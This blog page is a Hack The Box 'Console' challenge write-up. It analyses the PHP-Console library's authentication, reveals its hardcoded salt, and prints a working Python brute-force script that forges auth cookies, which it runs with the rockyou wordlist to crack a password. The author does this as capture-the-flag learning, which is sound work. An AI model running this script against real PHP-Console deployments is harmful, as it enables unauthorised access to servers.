@@ -1,0 +1,575 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Beating Console challenge from Hackthebox - $ Bit escape</title>
+<meta name="description" content="This challenge from hackthebox, give you an address with a running PHP application, when you open the web page, you will notice a phpinfo() page with:">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="$ Bit escape">
+<meta property="og:title" content="Beating Console challenge from Hackthebox">
+<meta property="og:url" content="https://aandersonl.github.io/cybersec/Hacking-PHP-Console-Hackthebox/">
+
+
+  <meta property="og:description" content="This challenge from hackthebox, give you an address with a running PHP application, when you open the web page, you will notice a phpinfo() page with:">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2020-04-29T00:31:36+00:00">
+
+
+
+
+
+
+<link rel="canonical" href="https://aandersonl.github.io/cybersec/Hacking-PHP-Console-Hackthebox/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "https://aandersonl.github.io/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="$ Bit escape Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          $ Bit escape
+          <span class="site-subtitle">It's good to see you here :)</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/programming/">Programming</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/cybersec/">Cybersec</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Beating Console challenge from Hackthebox">
+    <meta itemprop="description" content="This challenge from hackthebox, give you an address with a running PHP application, when you open the web page, you will notice a phpinfo() page with:">
+    <meta itemprop="datePublished" content="2020-04-29T00:31:36+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Beating Console challenge from Hackthebox
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2020-04-29T00:31:36+00:00">April 29, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          5 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#php-console">PHP-Console</a></li>
+  <li><a href="#chrome-extension">Chrome Extension</a></li>
+  <li><a href="#generating-our-in-python">Generating our in Python</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p>This challenge from <a href="https://www.hackthebox.eu/">hackthebox</a>, give you an address with a running PHP application, when you open the web page, you will notice a phpinfo() page with:</p>
+
+<p><strong><em>Your IP is 10.255.0.2 Make sure to load php-console in order to be prompted for a password</em></strong></p>
+
+<p>The first thing that came in my mind, was to look for this <code class="highlighter-rouge">php-console</code>, probably in <code class="highlighter-rouge">/php-console?some_rce_args=cat flag</code>, but nop, it’s far to be so easy. So i searched for <code class="highlighter-rouge">php-console</code> keyword, and i came up in this very crazy library <a href="https://github.com/barbushin/php-console">PHP-Console</a>.</p>
+
+<h2 id="php-console">PHP-Console</h2>
+
+<p>This library allows you to debug the PHP code running through your browser, looks very weird and insecure, right? So, this PHP-Console has another client tool for chrome, it`s an <a href="https://chrome.google.com/webstore/detail/php-console/nfhmhhlpfleoednkpnnnkolmclajemef">extension</a> that communicate to the PHP-Console server.</p>
+
+<p>Both libraries are <strong><em>open source</em></strong> which allows us to inspect the source code and try to find some vuln that we can explore or take advantage of. But let’s try to understand how the Auth works.</p>
+
+<p><strong><em>Disclamer</em></strong> As a developer too, this tools looks very useful when you are <code class="highlighter-rouge">developing</code> something in PHP, and should not be deployed in production (obvious).</p>
+
+<h2 id="chrome-extension">Chrome Extension</h2>
+
+<p>When you access the website now, you will see a key icon, that means that this PHP-Console is “protected”</p>
+
+<p><img src="https://aandersonl.github.io/assets/images/console_hackthebox/chrome_password.png" alt="" /></p>
+
+<p>If you type anything inside this box, the page will be reloaded and nothing will happen. Now let’s analyze all the communication workflow with/without this extension.</p>
+
+<p>So, this is my request headers without the extension php-console:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: docker.hackthebox.eu:32741
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.163 Chrome/80.0.3987.163 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: php-console-server=5
+</code></pre></div></div>
+<p>This is the response <strong><em>without</em></strong> the extension:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Sat, 18 Apr 2020 18:11:40 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.2.28
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 10694
+Keep-Alive: timeout=5, max=99
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+</code></pre></div></div>
+
+<p>Now take a look into my request <strong><em>with</em></strong> the extension:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET / HTTP/1.1
+Host: docker.hackthebox.eu:32741
+Connection: keep-alive
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.163 Chrome/80.0.3987.163 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://docker.hackthebox.eu:32741/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjV9
+</code></pre></div></div>
+<p>Response:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Date: Sat, 18 Apr 2020 18:11:47 GMT
+Server: Apache/2.4.38 (Debian)
+X-Powered-By: PHP/7.2.28
+PHP-Console-Postpone: {"protocol":5,"isPostponed":true,"id":"8737403131977641650632750738"}
+PHP-Console: {"protocol":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","isSuccess":false},"docRoot":null,"sourcesBasePath":null,"getBackData":null,"isLocal":null,"isSslOnlyMode":false,"isEvalEnabled":null,"messages":[]}
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 10694
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+</code></pre></div></div>
+
+<p>In our request, we have new cookies, php-console-server and php-console-client, php-console-server looks like the version of that addon and the php-console-client is base64 encoded. But before we decode that, let’s try some random password and see if the cookie itself changes.</p>
+
+<p>New cookie with random password:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiZDhjMzkyM2FkMWI5ZjJmMmJlZTQ2MzE2ZjEwNDM5Y2M3MGNiYTNkNTIxNDg2YWE3NWIwMjYyMmM2NTNlMDVkMCJ9fQ==
+</code></pre></div></div>
+
+<p>Good, now lets decode that and see what the extension is saving as a cookie:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"d8c3923ad1b9f2f2bee46316f10439cc70cba3d521486aa75b02622c653e05d0"}}
+</code></pre></div></div>
+
+<p>Ok, lets take a breath now, i took about 5-6 hours to beat this challenge, because the way the authentication works here is a bit crazy, the workflow is</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+--------------+                +--------------+               +---------------------------+
+|              |                |              |               |PHP-Console validate Cookie|
+| Get Password |                |Generate Token|  Post request |                           |
+|              +----------------+Set as Cookie +---------------&gt;                           |
+|              |                |              |               |                           |
+|              |                |              +&lt;--------------+                           |
++--------------+                +--------------+               +---------------------------+
+</code></pre></div></div>
+
+<p>Ok, now let’s dig inside the extension code, it’s easy because it’s an <a href="https://github.com/barbushin/php-console-extension">open source</a> extension so we don’t need to dig into the source files in browser/unzip the extension :)</p>
+
+<p>I want to authenticate this, so the auth file is in <strong><em>js/auth.js</em></strong>, and there is a bunch of functions, but let’s focused in the good ones: <strong><em>getPasswordHash</em></strong>, <strong><em>getAuthToken</em></strong>.</p>
+
+<p>Password hash:</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">getPasswordHash</span><span class="p">(</span><span class="nx">password</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">CryptoJS</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">SHA256</span><span class="dl">'</span><span class="p">](</span><span class="nx">password</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">NeverChangeIt:)</span><span class="dl">'</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>So the password hash, is a sha256 hash with a <a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">salt</a>, the salt is <code class="highlighter-rouge">NeverChangeIt:)</code></p>
+
+<p>Token generator:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">this</span><span class="p">.</span><span class="nx">getAuthToken</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">if</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">hash</span> <span class="o">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="nx">publicKey</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">CryptoJS</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">SHA256</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">.</span><span class="nx">hash</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">publicKey</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">};</span>
+</code></pre></div></div>
+<p>And the token is, a sha256 hash with our passwordhash + publickey</p>
+
+<h2 id="generating-our-in-python">Generating our in Python</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">password</span><span class="o">=</span><span class="s">"123456"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">salt</span><span class="o">=</span><span class="s">"NeverChangeIt:)"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">password_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">salt</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">password_hash</span>
+<span class="s">'d6b9942d933f39a7ffc037e0d7a590b588e69e2d150cc495b3ebad5b45b78e89'</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">pub_key</span><span class="o">=</span><span class="s">"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e"</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">token</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">password_hash</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="n">pub_key</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">token</span>
+<span class="s">'708a7032509aed6adf0556237b842491c0fe990c58b7bc66d36c30a6004c5b09'</span>
+<span class="o">&gt;&gt;&gt;</span> 
+</code></pre></div></div>
+
+<p><strong><em>The public key is calculate based in our ip address(in this case, the hackthebox reverse proxy one), i will not enter in all details but you can take a look <a href="https://github.com/barbushin/php-console/blob/aaf84d32782ef6122732b43b1e26cb15fd12f7c5/src/PhpConsole/Auth.php#L72">here</a> in the php-console source code, it’s very simple</em></strong></p>
+
+<p>Now i will enter 123456 in the extension and see if i can get the same token, take a look at our request:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Cookie: php-console-server=5; php-console-client=eyJwaHAtY29uc29sZS1jbGllbnQiOjUsImF1dGgiOnsicHVibGljS2V5IjoiZDFkNThiMmY3MzJmZDU0NmQ5NTA3ZGEyNzVhNzFiZGRjMGMyMzAwYTIxNGFmM2YzZjNhNWY1ZjI0OWZlMjc1ZSIsInRva2VuIjoiNzA4YTcwMzI1MDlhZWQ2YWRmMDU1NjIzN2I4NDI0OTFjMGZlOTkwYzU4YjdiYzY2ZDM2YzMwYTYwMDRjNWIwOSJ9fQ==
+</code></pre></div></div>
+<p>Decoding:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"708a7032509aed6adf0556237b842491c0fe990c58b7bc66d36c30a6004c5b09"}}
+</code></pre></div></div>
+
+<p>Good!! Now its possible to generate our custom <code class="highlighter-rouge">brute force</code> script :), i took a deep and long breath, made some coffe and started to code. And i came up with this php-console bruteforce script!</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="kn">import</span> <span class="nn">json</span><span class="p">,</span><span class="n">base64</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+
+<span class="k">class</span> <span class="nc">PHP_ConsoleAuth</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">salt</span><span class="p">,</span> <span class="n">remote_addr</span> <span class="o">=</span> <span class="bp">None</span><span class="p">,</span> <span class="n">pub_key</span> <span class="o">=</span> <span class="bp">None</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">salt</span> <span class="o">=</span> <span class="n">salt</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">remote_addr</span> <span class="o">=</span> <span class="n">remote_addr</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pass_hash</span> <span class="o">=</span> <span class="bp">None</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">token</span> <span class="o">=</span> <span class="bp">None</span>   
+        <span class="bp">self</span><span class="p">.</span><span class="n">pub_key</span> <span class="o">=</span> <span class="n">pub_key</span>
+
+    
+    <span class="k">def</span> <span class="nf">getToken</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">token</span> <span class="o">=</span>  <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">pass_hash</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">pub_key</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">token</span>
+    
+    <span class="k">def</span> <span class="nf">setPassword</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">password</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+
+    <span class="k">def</span> <span class="nf">calcPassHash</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="p">.</span><span class="n">pass_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">password</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="bp">self</span><span class="p">.</span><span class="n">salt</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="n">digest</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">self</span><span class="p">.</span><span class="n">pass_hash</span>
+
+<span class="s">"""
+Auth lib -&gt; https://github.com/barbushin/php-console/blob/master/src/PhpConsole/Auth.php
+
+"""</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    
+    <span class="n">SALT</span> <span class="o">=</span> <span class="s">'NeverChangeIt:)'</span>
+    <span class="c1"># Pub key is unique because its the sha256sum(clientUID + passwordHash) and the clientUI is the Remote Address, in our case is a fixed one
+</span>    <span class="c1"># Extracted using chrome extension
+</span>    <span class="n">PUB_KEY</span> <span class="o">=</span> <span class="s">"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e"</span> 
+    <span class="n">passwords_list</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">hackthebox_url</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="n">auth</span> <span class="o">=</span> <span class="n">PHP_ConsoleAuth</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="n">SALT</span><span class="p">,</span> <span class="n">pub_key</span><span class="o">=</span><span class="n">PUB_KEY</span><span class="p">)</span>
+    
+    <span class="n">success</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Starting bruteforce on {}  PHP-Console [+]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">hackthebox_url</span><span class="p">))</span>
+    
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">passwords_list</span><span class="p">,</span> <span class="s">'r'</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s">'ignore'</span><span class="p">)</span> <span class="k">as</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">.</span><span class="n">readlines</span><span class="p">():</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">password</span><span class="p">:</span> <span class="k">continue</span>
+            <span class="n">password</span> <span class="o">=</span> <span class="n">password</span><span class="p">.</span><span class="n">rstrip</span><span class="p">()</span>
+            <span class="n">auth</span><span class="p">.</span><span class="n">setPassword</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> 
+            <span class="n">auth</span><span class="p">.</span><span class="n">calcPassHash</span><span class="p">()</span>
+
+        
+            <span class="k">print</span><span class="p">(</span><span class="s">"[+] Trying {} [+]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+            <span class="n">token</span> <span class="o">=</span> <span class="n">auth</span><span class="p">.</span><span class="n">getToken</span><span class="p">()</span>
+            <span class="n">json_req</span> <span class="o">=</span> <span class="p">{</span>
+                <span class="s">"php-console-client"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
+                <span class="s">"auth"</span><span class="p">:</span> <span class="p">{</span>
+                    <span class="s">"publicKey"</span><span class="p">:</span> <span class="n">PUB_KEY</span><span class="p">,</span>
+                    <span class="s">"token"</span><span class="p">:</span> <span class="n">token</span> 
+                <span class="p">}</span> 
+            <span class="p">}</span>
+
+            <span class="n">pack</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">json_req</span><span class="p">).</span><span class="n">encode</span><span class="p">()).</span><span class="n">decode</span><span class="p">()</span>
+            <span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span><span class="s">"php-console-server"</span><span class="p">:</span> <span class="s">"5"</span><span class="p">,</span> <span class="s">"php-console-client"</span><span class="p">:</span> <span class="n">pack</span><span class="p">}</span>
+            <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">hackthebox_url</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+
+            <span class="n">php_console_res</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'PHP-Console'</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">php_console_res</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">"Is this really running PHP-CONSOLE ?"</span><span class="p">)</span>
+                <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+            
+            <span class="n">php_console_res</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">php_console_res</span><span class="p">)</span>
+            <span class="n">success</span> <span class="o">=</span> <span class="n">php_console_res</span><span class="p">[</span><span class="s">'auth'</span><span class="p">][</span><span class="s">'isSuccess'</span><span class="p">]</span>
+
+            <span class="k">if</span> <span class="n">success</span><span class="p">:</span>        
+                <span class="k">print</span><span class="p">(</span><span class="s">"[+] Cracked! Password -&gt; {} [+]"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
+                <span class="k">break</span>
+
+
+</code></pre></div></div>
+<p>I downloaded the classic <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt">rockyou.txt</a> wordlist, and run against our target:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 brute.py docker.hackthebox.eu:32741 rockyou.txt
+...
+<span class="o">[</span>+] Cracked! Password -&gt; poohbear <span class="o">[</span>+]
+
+</code></pre></div></div>
+
+<p>Now enter the password, and the flag will be in the alert!</p>
+
+<p>I don’t know if i can post the flag here, but the flag will be in the alert!</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/cybersec" class="page__taxonomy-item" rel="tag">cybersec</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-04-29T00:31:36+00:00">April 29, 2020</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/cybersec/write-up/Fireshell-CTF-2020/" class="pagination--pager" title="Fireshell CTF 2020 Write-ups
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+      
+        
+          <li><a href="https://github.com/aandersonl" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://br.linkedin.com/in/anderson-leite-6886b117a" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> Linkedin</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 $ Bit escape. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
